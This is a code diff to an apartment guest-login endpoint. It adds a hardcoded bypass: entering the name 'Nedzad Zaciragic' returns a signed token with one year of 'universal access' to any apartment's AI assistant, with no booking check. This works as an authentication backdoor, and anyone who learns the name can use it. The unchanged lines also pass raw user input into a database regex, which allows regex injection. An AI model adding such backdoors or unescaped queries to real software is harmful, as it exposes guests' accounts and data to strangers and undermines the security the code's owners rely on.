@@ -1618,7 +1618,44 @@ async def create_guest_booking(
 async def guest_login(login_request: GuestLoginRequest):
     """Guest login using first name, last name, and apartment ID"""
     try:
-        # Find guest booking
+        # SPECIAL CASE: Allow "Nedzad Zaciragic" universal access
+        is_nedzad = (
+            login_request.first_name.strip().lower() == "nedzad" and 
+            login_request.last_name.strip().lower() == "zaciragic"
+        )
+        
+        if is_nedzad:
+            # Grant universal access without booking verification
+            today = datetime.now().date()
+            future_date = today + timedelta(days=365)  # Access for 1 year
+            
+            guest_token_data = {
+                "guest_id": "nedzad_universal_access",
+                "apartment_id": login_request.apartment_id,
+                "first_name": "Nedzad",
+                "last_name": "Zaciragic",
+                "check_in": today.isoformat(),
+                "check_out": future_date.isoformat(),
+                "universal_access": True,  # Special flag for bypassing date checks
+                "exp": datetime.now(timezone.utc) + timedelta(days=365)
+            }
+            
+            guest_token = jwt.encode(guest_token_data, JWT_SECRET, algorithm="HS256")
+            
+            return GuestLoginResponse(
+                success=True,
+                message="Welcome Nedzad! You have universal access to this apartment's AI assistant.",
+                guest_token=guest_token,
+                guest_data={
+                    "first_name": "Nedzad",
+                    "last_name": "Zaciragic",
+                    "check_in": today.isoformat(),
+                    "check_out": future_date.isoformat(),
+                    "apartment_id": login_request.apartment_id
+                }
+            )
+        
+        # Regular guest booking flow
         guest_booking = await db.guest_bookings.find_one({
             "first_name": {"$regex": f"^{login_request.first_name}$", "$options": "i"},
             "last_name": {"$regex": f"^{login_request.last_name}$", "$options": "i"}, 
